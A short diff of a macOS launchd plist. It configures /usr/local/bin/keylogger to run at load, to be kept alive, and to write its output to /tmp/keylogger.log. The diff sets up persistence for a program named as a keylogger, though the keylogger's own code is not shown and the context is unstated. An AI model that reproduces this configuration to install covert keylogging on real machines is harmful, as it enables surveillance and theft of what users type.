@@ -8,9 +8,9 @@
   <array>
       <string>/usr/local/bin/keylogger</string>
   </array>
-  <key>RunAtLoad</key>
-  <true/>
-  <key>KeepAlive</key>
-  <true/>
+  <key>StandardOutPath</key> <string>/tmp/keylogger.log</string>
+  <key>StandardErrorPath</key> <string>/tmp/keylogger.log</string>
+  <key>RunAtLoad</key> <true/>
+  <key>KeepAlive</key> <true/>
 </dict>
 </plist>
